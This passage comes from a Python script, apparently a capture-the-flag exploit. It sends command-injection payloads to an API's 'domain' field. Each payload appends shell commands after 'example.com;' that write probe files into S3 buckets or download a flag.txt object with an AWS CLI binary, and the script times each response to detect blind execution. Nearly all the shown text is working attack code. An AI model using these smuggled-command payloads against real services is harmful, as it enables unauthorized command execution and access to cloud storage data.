                  "--bucket userad88e2b168aa387e "
                  "--key ctf-probe.txt "
                  "--body /tmp/ctf_probe "
                  "--region us-east-1 "
                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
                  ">/tmp/aws_result 2>&1 && sleep 5"
              ),
              (
                  "write_log_bucket",
                  "example.com; "
                  "printf CTF_PROBE > /tmp/ctf_probe; "
                  "/opt/aws s3api put-object "
                  "--bucket logad88e2b168aa387e "
                  "--key ctf-probe.txt "
                  "--body /tmp/ctf_probe "
                  "--region us-east-1 "
                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
                  ">/tmp/aws_result 2>&1 && sleep 5"
              ),
              (
                  "write_site_bucket",
                  "example.com; "
                  "printf CTF_PROBE > /tmp/ctf_probe; "
                  "/opt/aws s3api put-object "
                  "--bucket site781fe43f26b9eba3 "
                  "--key ctf-probe.txt "
                  "--body /tmp/ctf_probe "
                  "--region us-east-1 "
                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
                  ">/tmp/aws_result 2>&1 && sleep 5"
              ),
              (
                  "read_flag",
                  "example.com; "
                  "/opt/aws s3api get-object "
                  "--bucket userad88e2b168aa387e "
                  "--key flag.txt "
                  "/tmp/flag.txt "
                  "--region us-east-1 "
                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
                  ">/tmp/aws_result 2>&1 && sleep 5"
              )
          ]

          for name, injected_domain in tests:
              start = time.monotonic()

              response = requests.post(
                  api,
                  json={"domain": injected_domain},
                  auth=auth,
                  timeout=20
              )

              elapsed = time.monotonic() - start

              print(f"TEST={name}")
